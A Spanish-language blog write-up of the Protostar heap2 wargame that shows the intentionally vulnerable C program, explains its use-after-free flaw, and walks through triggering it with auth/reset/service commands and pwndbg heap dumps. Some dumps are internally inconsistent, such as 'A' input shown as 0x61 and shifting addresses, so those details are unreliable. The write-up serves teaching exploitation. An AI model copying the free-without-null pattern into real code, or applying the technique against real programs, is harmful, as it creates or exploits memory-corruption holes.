---
layout: post
title: protostar heap2 - UAF (Use-After-Free)
author: c4rta
date: 2023-01-21
##categories: [Explotacion binaria]
tags: [Explotacion Binaria, Heap, UAF]
image: /assets/img/heap2/waifu4.jpg
---
Este desafio es una introduccion una tecnica llamada Use-After-Free la cual basicamente ocurre cuando se hace referencia a la memoria despues de que haya sido liberada
{:.lead}


## Analizando el binario y explotacion

El codigo que nos proveen es este:

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
 
struct auth {
  char name[32];
  int auth;
};
 
struct auth *auth;
char *service;
 
int main(int argc, char **argv)
{
  char line[128];
 
  while(1) {
      printf("[ auth = %p, service = %p ]\n", auth, service);
 
      if(fgets(line, sizeof(line), stdin) == NULL) break;
       
      if(strncmp(line, "auth ", 5) == 0) {
          auth = malloc(sizeof(auth));
          memset(auth, 0, sizeof(auth));
          if(strlen(line + 5) < 31) {
              strcpy(auth->name, line + 5);
          }
      }
      if(strncmp(line, "reset", 5) == 0) {
          free(auth);
      }
      if(strncmp(line, "service", 6) == 0) {
          service = strdup(line + 7);
      }
      if(strncmp(line, "login", 5) == 0) {
          if(auth->auth) {
              printf("you have logged in already!\n");
          } else {
              printf("please enter your password\n");
          }
      }
  }
}
```
Vemos que el programa se queda en un bucle infinito gracias a ```while(1)```, ademas recibe 4 comandos: auth, reset, service y login.

Primeramente se esta declarando una estructuta llamada ```auth``` la cual tiene dos variables:

```c
struct auth {
  char name[32];
  int auth;
};
```
En la cual ```name``` es una arreglo de caracteres de 32 bytes.

De ahi nos vamos al primer if:

```c
if(strncmp(line, "auth ", 5) == 0) {
          auth = malloc(sizeof(auth));
          memset(auth, 0, sizeof(auth));
          if(strlen(line + 5) < 31) {
              strcpy(auth->name, line + 5);
          }
      }
```
En el cual si el input es ```auth```, le asignaremos memoria con ```malloc()```, y el resto del input es tomado por la variable ```name``` de ```struct auth```

En el segundo if:

```c
if(strncmp(line, "reset", 5) == 0) {
          free(auth);
      }
```
Lo que hace aqui es liberar memoria de el objeto ```auth``` 

En el tercer if:

```c
if(strncmp(line, "service", 6) == 0) {
          service = strdup(line + 7);
      }
```
Lo que hace es tomar el resto de la entrada y le asigna memoria con ```strdup```, la cual esta devuelve un puntero

Y el ultimo if:

```c
if(strncmp(line, "login", 5) == 0) {
          if(auth->auth) {
              printf("you have logged in already!\n");
          } else {
              printf("please enter your password\n");
          }
      }
```

Lo que hace es realizar una verificacion si el ```auth struct``` tiene un valor igual que 0.

Para resolver el desafio lo que hacer que hacer es pasar la condición de que auth->auth sea un valor que no sea cero, ya que en ninguna parte del código se le asigna un valor a auth->auth.

Asi que para resolver esta desafio tenemos que mostrar: ```you have logged in already!```

Aqui lo que se me ocurre hacer es asignar memoria con ```auth```, luego liberar le memoria con ```reset``` y despues dar un input usando el comando ```service```, lo suficientemente grande para para sobreescribir ```auth->auth```, esto hara que el programa intente acceder a ```auth struct``` pero ahora su memoria se libero y luego se sobreescribio con lo que le metimos con ```service``` y ahora ```auth->auth``` es diferente de 0

### Visualizandolo en gdb

Lo primero es ver el contenido de la memoria de auth cuando tiene un valor asignado a ```auth->name```, osea cuando se ingresa el comando ```auth```

Esto lo hare poniendo en breakpoint en ```0x08048a01``` que es donde se hace lo que dije arriba

Primeramente podemos ver como en ```EAX``` se almacena nuestro input:

```*EAX  0x804c818 ◂— 'c4rta\n'```

Y si mostramos el contenido del registro ```EAX``` podemos ver algo como esto:

```eax            0x804c818           134531096```

La memoria asignada por ```malloc()``` esta ubicada en ```0x804c818``` el cual se guardo en ```EAX``` que es el valor de retorno de ```malloc()``` que contiene nuestro input

Sin embargo, si mostramos unos cuantos bytes por debajo del valor de retorno de ```malloc()```, podemos ver esto:

```
pwndbg> x/20xb $eax-8 
0x804c810:	0x00	0x00	0x00	0x00	0x11	0x00	0x00	0x00
0x804c818:	0x63	0x34	0x72	0x74	0x61	0x0a	0x00	0x00
0x804c820:	0x00	0x00	0x00	0x00
```

Aqui quiero destacar el ```0x11```, el encabezado del ```chunk``` muestra que solo hay 16 bytes asignados (```0x00000011```), donde el bit LS es un indicador que indica que se ha asignado el fragmento anterior, (esto se conoce como la flag ```PREV_INUSE```), en lugar de los bytes necesario para ```auth struct``` , esto es por que en la línea 25, la llamada ```malloc()``` obtiene el tamaño del puntero con el mismo nombre que la estructura, y debido a que cada puntero tiene un tamaño de 4 bytes, ```malloc()``` asigna 4 bytes más los 8 bytes adicionales para el encabezado.

Ademas tambien podemos ver nuestro input el cual es:

```0x63	0x34	0x72	0x74	0x61```

Ahora es momento de saber que pasa si hacemos un ```reset``` y despues un ```login```

```
pwndbg> x /20xb $eax-8 
0x804c000:  0x00    0x00    0x00    0x00    0x11    0x00    0x00    0x00 
0x804c008:  0x00    0x00    0x00    0x00    0x0a    0x00    0x00    0x00 
0x804c010:  0x00    0x00    0x00    0x00    0xf1
```
Aqui ya se puso interesante la cosa, el objeto del heap esta alli (de ```0x11``` a ```0xf1``` el cual ```0xf1``` es llamado ```top chunk```), pero nuestro input ya no esta, entonces ahora veremos que pasa si creamos un nuevo objeto en el heap usando ```service``` pero pasandole un tamaño mas grande que 16 bytes, esto lo podemos hacer ya que la memoria despues de ```free()``` esta disponible para volverla a asignar:

```
[ auth = 0x804c818, service = (nil) ]
service AAAAAAAAAAAAAAAAAA
```

Podemos ver como se asigno en el espacio anterior, osea en ```auth```, esto es ya que tiene la misma direccion: ```0x804c818```, pero eso no es todo, tambien logramos sobreescribir ```auth->auth``` gracias a ```service``` , esto lo podemos ver si mostramos unos cuantos bytes desde ```0x804c818```:

```
pwndbg> x /64xb 0x804c818
0x804c818:	0x20	0x61	0x61	0x61	0x61	0x61	0x61	0x61
0x804c820:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61
0x804c828:	0x61	0x61	0x61	0x0a	0x00	0x00	0x00	0x00
0x804c830:	0x00	0x00	0x00	0x00	0xd1	0x07	0x00	0x00
0x804c838:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804c840:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804c848:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804c850:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
```
Podemos ver como en la direccion ```0x804c828``` que es la de ```auth->auth``` ahora contiene ```0x61	0x61	0x61``` de mas


Y ahora aun que el objeto del heap se libero, el puntero a ```auth->auth``` no se anulo, y aun se usa, y dará como resultado un valor diferente de 0, asi que si continuamos la ejecucion vemos como ya obtuvimos la flag:

```
pwndbg> c
Continuing.
you have logged in already!
```

Y si fue como explotamos un UAF basico aprovechandonos de una sobreescritura con ```service``` para usar usar un ```chunk``` liberado anteriormente el cual ahora es llamado ```free chunk```

Eso ha sido todo, y tranquilo si no llegaste a entender lo que pasaba, por que ni yo ni nadie entiende estas cosas a la primera, pero con tiempo y diciplina se puede lograr. Realmente no me gustaria que te frustraras por algo asi, tu puedes. Gracias por leer ❤
